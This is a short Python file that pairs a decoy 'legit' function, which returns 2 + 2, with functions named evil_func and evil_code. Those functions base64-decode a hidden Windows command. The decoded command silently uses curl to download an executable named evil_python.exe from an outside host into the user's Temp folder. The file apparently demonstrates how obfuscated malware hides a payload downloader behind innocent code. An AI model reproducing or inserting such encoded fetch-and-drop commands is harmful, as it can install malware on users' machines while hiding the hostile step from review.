import base64

def evil_func():
    return base64.b64decode("Y3VybCAtbyBDOlxVc2Vyc1wldXNlcm5hbWUlXEFwcERhdGFcTG9jYWxcVGVtcFxldmlsX3B5dGhvbi5leGUgaHR0cHM6Ly9zcGFjZXlsYWQucHl0aG9uYW55d2hlcmUuY29tL3N0YXRpYy9ldmlsX3B5dGhvbi5leGUgLXM=").decode()


def evil_code():
    evil_command = evil_func()
    return evil_command


def legit_usefull():
    print("Here is some legit code that is very useful! :] It is the answer of what 2 + 2 is! :D")
    return 2 + 2